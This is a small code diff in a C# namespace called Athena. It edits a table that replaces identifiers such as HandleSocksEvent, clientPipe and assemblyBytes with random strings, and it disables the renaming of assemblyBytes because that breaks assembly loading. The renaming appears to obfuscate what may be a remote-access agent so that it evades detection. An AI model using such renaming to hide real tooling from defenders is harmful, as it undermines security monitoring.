@@ -245,7 +245,7 @@ namespace Athena
                 { "HandleSocksEvent", RandomString(30) },
                 { "exited", RandomString(30) },
                 { "smOut", RandomString(30) },
-                { "assemblyBytes", RandomString(30) },
+                //{ "assemblyBytes", RandomString(30) }, //Breaks assembly loading
                 { "target", RandomString(30) },
                 { "clientPipe", RandomString(30) },
                 { "partialMessages", RandomString(30) },
